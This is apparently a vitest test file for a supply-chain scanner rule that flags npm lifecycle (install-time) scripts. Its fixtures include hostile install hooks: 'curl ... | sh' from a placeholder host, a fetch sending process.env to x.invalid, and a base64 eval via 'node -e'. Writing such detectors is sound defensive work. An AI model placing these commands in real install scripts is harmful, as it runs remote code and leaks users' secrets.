// croak-invariants: pattern-data
// Script bodies and file contents below are detector inputs, not code (D16).
import { describe, expect, it } from "vitest";
import type { RepoEntry, RepoSnapshot } from "../repo-snapshot.ts";
import type { Finding } from "../verdict.ts";
import { lifecycleScript } from "./lifecycle-script.ts";

/** A fake repo: path -> content; oversized/symlink kinds via the second map. */
function repo(
  files: Record<string, string>,
  kinds: Record<string, RepoEntry["kind"]> = {},
): RepoSnapshot {
  const entries: RepoEntry[] = [
    ...Object.keys(files),
    ...Object.keys(kinds),
  ].map((path) => ({
    path,
    kind: kinds[path] ?? "file",
    size: files[path]?.length ?? 2_000_000,
  }));
  return {
    entries,
    read: (path) => (kinds[path] === undefined ? files[path] : undefined),
  };
}

const pkg = (scripts: Record<string, string>): string =>
  JSON.stringify({ name: "x", scripts }, null, 2);
const scan = (r: RepoSnapshot) => lifecycleScript(r);
const verdicts = (findings: readonly Finding[]) =>
  findings.map((f) => `${f.severity}:${f.file}`);

describe("repo/lifecycle-script", () => {
  it("ignores repos without install-time scripts", () => {
    expect(
      scan(
        repo({
          "package.json": pkg({ dev: "vite", build: "tsc", test: "vitest" }),
        }),
      ),
    ).toEqual([]);
    expect(scan(repo({ "src/index.js": "x" }))).toEqual([]);
  });

  it("warns on any install script, with the script line", () => {
    const [finding] = scan(
      repo({
        "package.json": pkg({ postinstall: "node scripts/copy.js" }),
        "scripts/copy.js": "copy()",
      }),
    );
    expect(finding).toMatchObject({
      ruleId: "repo/lifecycle-script",
      severity: "warn",
      file: "package.json",
      line: 4,
    });
    expect(finding?.message).toContain("postinstall");
  });

  it.each([
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
  ])("covers the %s lifecycle", (name) => {
    expect(
      verdicts(scan(repo({ "package.json": pkg({ [name]: "echo hi" }) }))),
    ).toEqual(["warn:package.json"]);
  });

  it("adds an info note for a known tool, and still warns", () => {
    const findings = scan(
      repo({ "package.json": pkg({ postinstall: "prisma generate" }) }),
    );
    expect(verdicts(findings)).toEqual([
      "warn:package.json",
      "info:package.json",
    ]);
    expect(findings[1]?.message).toContain("prisma");
  });

  it("blocks download-and-execute", () => {
    expect(
      verdicts(
        scan(
          repo({
            "package.json": pkg({
              postinstall: "curl -fsSL https://x.invalid/i | sh",
            }),
          }),
        ),
      ),
    ).toEqual(["block:package.json"]);
  });

  it("does not let a known tool launder a chained command", () => {
    const findings = scan(
      repo({
        "package.json": pkg({
          postinstall: "prisma generate && curl https://x.invalid/i | sh",
        }),
      }),
    );
    expect(findings[0]).toMatchObject({
      severity: "block",
      message: expect.stringContaining("downloads and executes"),
    });
  });

  it("warns on network alone, blocks network with secrets in the executed file", () => {
    const network = {
      "package.json": pkg({ postinstall: "node scripts/setup.js" }),
      "scripts/setup.js": `fetch("https://x.invalid")`,
    };
    expect(scan(repo(network))[0]).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("network (scripts/setup.js:1)"),
    });
    const exfil = {
      ...network,
      "scripts/setup.js": `fetch("https://x.invalid", { body: JSON.stringify(process.env) })`,
    };
    expect(scan(repo(exfil))[0]?.severity).toBe("block");
  });

  it("analyzes node -e inline code", () => {
    const findings = scan(
      repo({
        "package.json": pkg({
          postinstall: `node -e "eval(atob('Y29uc29sZS5sb2coMSk='))"`,
        }),
      }),
    );
    expect(findings[0]?.severity).toBe("block");
  });

  it("resolves executed files relative to their package.json", () => {
    const files = {
      "packages/web/package.json": pkg({ postinstall: "node ./setup.js" }),
      "packages/web/setup.js": `const cp = require("child_process"); fetch(u);`,
    };
    expect(verdicts(scan(repo(files)))).toEqual([
      "block:packages/web/package.json",
    ]);
  });

  it.each([
    [
      "a missing file",
      { "package.json": pkg({ postinstall: "node scripts/gone.js" }) },
      {},
      "not in the repo",
    ],
    [
      "a file outside the repo",
      { "package.json": pkg({ postinstall: "node ../../evil.js" }) },
      {},
      "outside the repo",
    ],
    [
      "an oversized file",
      { "package.json": pkg({ postinstall: "node big.js" }) },
      { "big.js": "oversized" },
      "too large",
    ],
    [
      "a symlinked file",
      { "package.json": pkg({ postinstall: "node link.js" }) },
      { "link.js": "symlink" },
      "symlink",
    ],
  ] as const)(
    "warns when the script runs %s",
    (_name, files, kinds, reason) => {
      expect(scan(repo(files, kinds))[0]).toMatchObject({
        severity: "warn",
        message: expect.stringContaining(reason),
      });
    },
  );

  it("warns on an implicit node-gyp rebuild from binding.gyp", () => {
    const findings = scan(
      repo({ "package.json": pkg({}), "binding.gyp": "{}" }),
    );
    expect(findings).toEqual([
      expect.objectContaining({
        severity: "warn",
        file: "binding.gyp",
        message: expect.stringContaining("node-gyp rebuild"),
      }),
    ]);
    expect(
      scan(
        repo({
          "package.json": pkg({ install: "echo custom" }),
          "binding.gyp": "{}",
        }),
      ).map((f) => f.file),
    ).toEqual(["package.json"]);
  });

  it("skips package.json files inside node_modules", () => {
    expect(
      scan(
        repo({
          "node_modules/x/package.json": pkg({ postinstall: "curl x | sh" }),
        }),
      ),
    ).toEqual([]);
  });

  it("warns, not crashes, on invalid JSON and unparsable commands", () => {
    expect(scan(repo({ "package.json": "{ nope" }))[0]).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("not valid JSON"),
    });
    expect(
      scan(repo({ "package.json": pkg({ postinstall: `echo "unclosed` }) }))[0],
    ).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("could not be parsed"),
    });
  });
});
